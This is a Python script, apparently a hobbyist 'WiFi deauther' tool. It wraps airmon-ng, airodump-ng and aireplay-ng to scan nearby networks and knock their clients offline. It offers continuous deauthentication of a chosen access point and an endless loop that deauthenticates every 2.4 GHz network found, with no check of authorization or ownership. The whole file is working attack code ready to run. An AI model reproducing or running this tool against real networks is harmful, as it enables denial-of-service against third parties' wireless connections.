#!/usr/bin/env python3

import subprocess
import os
import time
import signal
import sys

# Global variables
networks = []  # Store discovered networks
scanning = True  # Control the live scanning loop

# Banner
def print_banner():
    banner = r"""
 ::'###::::'########::'########:'##::::'##:'##::::'##::::'###:::::'######::'##:::'##:
::'## ##::: ##.... ##: ##.....:: ##:::: ##: ##:::: ##:::'## ##:::'##... ##: ##::'##::
:'##:. ##:: ##:::: ##: ##::::::: ##:::: ##: ##:::: ##::'##:. ##:: ##:::..:: ##:'##:::
'##:::. ##: ########:: ######::: ##:::: ##: #########:'##:::. ##: ##::::::: #####::::
 #########: ##.. ##::: ##...:::: ##:::: ##: ##.... ##: #########: ##::::::: ##. ##:::
 ##.... ##: ##::. ##:: ##::::::: ##:::: ##: ##:::: ##: ##.... ##: ##::: ##: ##:. ##::
 ##:::: ##: ##:::. ##: ########:. #######:: ##:::: ##: ##:::: ##:. ######:: ##::. ##:
..:::::..::..:::::..::........:::.......:::..:::::..::..:::::..:::......:::..::::..::
.....................................................................................
DEVELOPED BY ATHUL                                              WIFI DEAUTHER VER 2.0
.....................................................................................
"""
    print(banner)

# Check for sudo privileges
if not 'SUDO_UID' in os.environ.keys():
    print("This script requires sudo privileges. Please run as root.")
    exit()

def check_dependencies():
    """Check if required tools are installed."""
    for tool in ["airmon-ng", "airodump-ng", "aireplay-ng", "iwconfig"]:
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            print(f"Error: {tool} is not installed. Install it using: sudo apt install aircrack-ng")
            exit()

def get_wifi_interfaces():
    """List all available WiFi interfaces."""
    result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
    interfaces = [line.split()[0] for line in result.split("\n") if "IEEE 802.11" in line]
    return interfaces

def enable_monitor_mode(interface):
    """Enable monitor mode on the selected interface."""
    print(f"Enabling monitor mode on {interface}...")
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"Monitor mode enabled on {interface}.")

def update_network_list(csv_file):
    """Parse networks from airodump-ng CSV file."""
    global networks
    if not os.path.exists(csv_file):
        return

    new_networks = []
    with open(csv_file, "r") as file:
        for line in file:
            if line.startswith("BSSID"):
                continue
            fields = line.split(",")
            if len(fields) > 14 and fields[13].strip() != "":
                network = {
                    "bssid": fields[0].strip(),
                    "channel": fields[3].strip(),
                    "essid": fields[13].strip()
                }
                if network not in networks:  # Add only unique networks
                    new_networks.append(network)

    if new_networks:
        networks.extend(new_networks)

def scan_networks_live(interface):
    """Live scan for WiFi networks using a loop."""
    global scanning
    print("Scanning for networks... Press Ctrl+C to stop and select a network.")
    try:
        process = subprocess.Popen(["airodump-ng", "--output-format", "csv", "-w", "scan_results", interface],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        while scanning:
            time.sleep(2)  # Update every 2 seconds
            update_network_list("scan_results-01.csv")
            os.system("clear")
            print_banner()
            print("\nAvailable Networks:")
            print("Index\tBSSID\t\t\tChannel\tESSID")
            for index, network in enumerate(networks):
                print(f"{index}\t{network['bssid']}\t{network['channel']}\t{network['essid']}")
    except KeyboardInterrupt:
        signal_handler_stop_scan(None, None)  # Handle interrupt to stop scanning gracefully
    finally:
        process.terminate()

def deauth_all_24ghz(interface):
    """Fast deauthentication of all 2.4 GHz networks."""
    print("Optimized deauthentication of all 2.4 GHz networks...")
    
    # Group networks by channel
    networks_by_channel = {}
    for network in networks:
        channel = int(network["channel"])
        if 1 <= channel <= 14:  # 2.4 GHz channels range
            if channel not in networks_by_channel:
                networks_by_channel[channel] = []
            networks_by_channel[channel].append(network)

    try:
        while True:
            for channel, channel_networks in networks_by_channel.items():
                # Switch to the channel
                subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL)
                print(f"\nDeauthenticating on Channel {channel}...")
                
                for network in channel_networks:
                    print(f"  Sending deauth packets to BSSID: {network['bssid']} (ESSID: {network['essid']})")
                    try:
                        # Send deauth packets
                        subprocess.run(
                            ["aireplay-ng", "--deauth", "3", "-a", network["bssid"], interface],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                    except Exception as e:
                        print(f"Error deauthenticating {network['bssid']}: {e}")
            
            print("Completed one cycle of deauth attacks on all channels. Repeating...")
    except KeyboardInterrupt:
        print("\nDeauthentication attack stopped.")


def deauth_attack(interface, bssid, channel):
    """Perform a deauthentication attack."""
    print(f"Setting interface to channel {channel}...")
    subprocess.run(["iwconfig", interface, "channel", channel])

    print(f"Starting deauth attack on BSSID {bssid}...")
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
    except KeyboardInterrupt:
        print("Deauth attack stopped.")

def cleanup():
    """Cleanup leftover files from airodump-ng."""
    for file in os.listdir():
        if file.startswith("scan_results"):
            os.remove(file)

def signal_handler_stop_scan(sig, frame):
    """Handle Ctrl+C to stop scanning without exiting."""
    global scanning
    if scanning:
        scanning = False  # Stop the live scanning loop
        print("\nScanning stopped. You can now select a network.\n")
    else:
        signal_handler_exit(sig, frame)

def signal_handler_exit(sig, frame):
    """Handle Ctrl+C to exit the script."""
    print("\nExiting the script. Cleaning up...")
    cleanup()
    sys.exit(0)

def main():
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler_stop_scan)  # First Ctrl+C stops scanning, second exits

    print_banner()  # Display the banner
    check_dependencies()

    # Get WiFi interfaces
    interfaces = get_wifi_interfaces()
    if not interfaces:
        print("No WiFi interfaces found. Ensure your WiFi adapter is connected.")
        exit()

    print("Available interfaces:")
    for index, iface in enumerate(interfaces):
        print(f"{index}: {iface}")

    # Select interface
    while True:
        try:
            choice = int(input("Select an interface to use for the attack: "))
            selected_interface = interfaces[choice]
            break
        except (ValueError, IndexError):
            print("Invalid choice. Try again.")

    # Enable monitor mode
    enable_monitor_mode(selected_interface)

    # Live scan networks
    scan_networks_live(selected_interface)

    # User selects action
    print("\nOptions:")
    print("1: Deauth a specific network")
    print("2: Deauth all 2.4 GHz networks (EXPERIMENTAL)")
    while True:
        try:
            option = int(input("Choose an option: "))
            if option == 1:
                # Select a network
                while True:
                    try:
                        choice = int(input("Select a network to deauth by index: "))
                        target = networks[choice]
                        break
                    except (ValueError, IndexError):
                        print("Invalid choice. Try again.")
                # Perform deauth
                deauth_attack(selected_interface, target["bssid"], target["channel"])
                break
            elif option == 2:
                # Deauth all 2.4 GHz networks
                deauth_all_24ghz(selected_interface)
                break
            else:
                print("Invalid option. Try again.")
        except ValueError:
            print("Invalid input. Try again.")

    # Cleanup temporary files
    cleanup()

if __name__ == "__main__":
    # Final exit handler
    signal.signal(signal.SIGINT, signal_handler_exit)
    main()
